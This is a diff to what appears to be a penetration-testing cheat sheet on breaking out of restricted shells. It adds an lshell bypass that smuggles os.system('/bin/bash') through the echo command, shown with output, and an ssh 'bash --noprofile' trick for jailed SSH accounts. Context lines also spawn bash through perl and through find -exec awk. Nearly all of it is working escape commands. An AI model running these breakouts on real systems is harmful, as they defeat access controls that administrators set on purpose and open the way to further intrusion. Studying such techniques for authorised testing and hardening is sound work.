@@ -28,6 +28,18 @@ perl --> perl -e 'exec "/bin/bash";'
 
 1. First for this method, find which bin file 'awk' is in
 find / -name udev -exec /usr/bin/awk 'BEGIN {system("/bin/bash -i")}' \;
+
+=================================================
+== Escape lshell 
+lshell can be easily bypassed provided you have access to the "echo" command:
+With lshell, the user is restricted to a number of limited commands:
+
+user:~$ id
+*** unknown command: id
+user:~$ echo os.system('/bin/bash')
+user@lshell:~$ id
+uid=1000(user) gid=1000(user) groupes=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),110(lshell)
+
 =================================================
 == Jailed SSH Shell?  Try this...              ==
 Initial Shell /bin/sh
@@ -36,7 +48,7 @@ Check the 'env' variable!
 Linux will default to /bin/bash default bashrc if there is no present .bashrc
 file in a User's home directory.  Legit Shell...)
 
-1. ssh user@127.0.0.1 "/bin/sh"
+1. ssh user@127.0.0.1 "/bin/sh"     OR    ssh user@127.0.0.1 -t "bash --noprofile"
 2. cd $HOME
 3. mv .bashrc .bashrc.BAK 
 4. exit
